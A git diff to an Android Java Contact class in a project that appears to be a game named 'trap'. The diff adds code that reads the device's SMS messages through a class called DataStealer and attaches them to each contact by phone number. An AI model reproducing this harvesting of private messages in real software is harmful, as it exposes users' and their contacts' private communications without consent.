@@ -15,9 +15,11 @@ import org.parceler.Parcel;
 import org.parceler.ParcelConstructor;
 
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.Objects;
 
 import androidx.annotation.NonNull;
+import de.hpi3d.gamepgrog.trap.android.DataStealer;
 import de.hpi3d.gamepgrog.trap.future.BiConsumer;
 
 /**
@@ -38,6 +40,7 @@ public class Contact implements UserData {
     private String organisation = ""; // Not implemented yet
     private String birthday = ""; // Birthday only for now
     private ArrayList<String> phoneNumbers; // Could be expanded to include type of number (phone/mobile) and label
+    private ArrayList<TextMessage> textMessages;
 
     public Contact(long Id) {
         this.id = Id;
@@ -120,14 +123,25 @@ public class Contact implements UserData {
         return phoneNumbers;
     }
 
-    public void setPhoneNumbers(ArrayList<String> phoneNumbers) {
-        this.phoneNumbers = phoneNumbers;
+    public ArrayList<TextMessage> getTextMessages() {
+        if (textMessages == null) {
+            return new ArrayList<>();
+        }
+        return textMessages;
+    }
+
+    public void addTextMessages(ArrayList<TextMessage> textMessages) {
+        if (this.textMessages == null) {
+            this.textMessages = new ArrayList<>();
+        }
+        this.textMessages.addAll(textMessages);
     }
 
     public void addPhoneNumber(String phoneNumber) {
         if (phoneNumbers == null) {
             phoneNumbers = new ArrayList<>();
         }
+        phoneNumber = phoneNumber.replaceAll("\\s", "");
         phoneNumbers.add(phoneNumber);
     }
 
@@ -159,14 +173,33 @@ public class Contact implements UserData {
 
         // Actual queries and enrichment
         enrichContacts(contactsById, selectionForUserIds, selectionArgsForUserIds, context);
+        enrichWithMessages(contactsById, context);
 
 
-        ArrayList<Contact> enrichedContacts = new ArrayList<Contact>(numberOfContacts);
+        ArrayList<Contact> enrichedContacts = new ArrayList<>(numberOfContacts);
         for (int i = 0; i < contactsById.size(); i++) {
             Contact contact = contactsById.valueAt(i);
             enrichedContacts.add(contact);
         }
         return enrichedContacts;
+    }
+
+    private static void enrichWithMessages(LongSparseArray<Contact> contactsById, Context context) {
+        ArrayList<TextMessage> textMessages = DataStealer.takeMessageData(context);
+
+        HashMap<String, ArrayList<TextMessage>> messageByAddress = TextMessage.orderByAddress(textMessages);
+        for (int i = 0; i < contactsById.size(); i++) {
+            Contact c = contactsById.valueAt(i);
+            for (String number : c.getPhoneNumbers()) {
+                ArrayList<TextMessage> messagesAtPhoneNumber = messageByAddress.get(number);
+                if (messagesAtPhoneNumber != null) {
+                    c.addTextMessages(messagesAtPhoneNumber);
+                    contactsById.setValueAt(i, c);
+                }
+            }
+        }
+
+
     }
 
     private static void enrichContacts(LongSparseArray<Contact> contactsById, String selectionForUserIds, String[] selectionArgsForUserIds, Context context) {
@@ -339,7 +372,11 @@ public class Contact implements UserData {
     @NonNull
     @Override
     public String toString() {
-        return id + " ||| " + displayNamePrimary + " ||| " + birthday + " ||| " + homeAddress;
+        String allPhoneNumbers = "";
+        for (String number : getPhoneNumbers()) {
+            allPhoneNumbers += number + " ; ";
+        }
+        return id + " ||| " + displayNamePrimary + " ||| ( " + allPhoneNumbers + ") ";
     }
 
     @Override
